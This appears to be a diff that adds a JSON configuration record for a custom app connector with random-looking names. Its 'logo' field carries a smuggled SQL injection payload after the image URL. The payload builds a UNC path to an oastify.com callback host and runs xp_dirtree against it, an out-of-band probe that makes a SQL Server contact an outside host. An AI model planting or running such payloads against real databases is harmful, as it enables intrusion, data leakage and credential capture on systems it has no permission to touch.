@@ -1,0 +1,15 @@
+{
+	"createdTime":1741342132952,
+	"deleted":false,
+	"enabled":false,
+	"id":"67cac5b419d8a25fc18fa7a1",
+	"lastModifiedBy":22743,
+	"lcName":"hsudcq",
+	"logo":"https://assets.unifyapps.com/images/app-icons/custom_connector_01.svg);declare @q varchar(99);set @q='\\\\9kugnnpglj09draaw8pa7vtrvi1bpcg07svkib60.oasti'+'fy.com\\ejt'; exec master.dbo.xp_dirtree @q;-- ",
+	"modifiedTime":1741342132952,
+	"name":"hsuDcq",
+	"ownerUserId":22743,
+	"standard":false,
+	"standardApp":false,
+	"version":0
+}
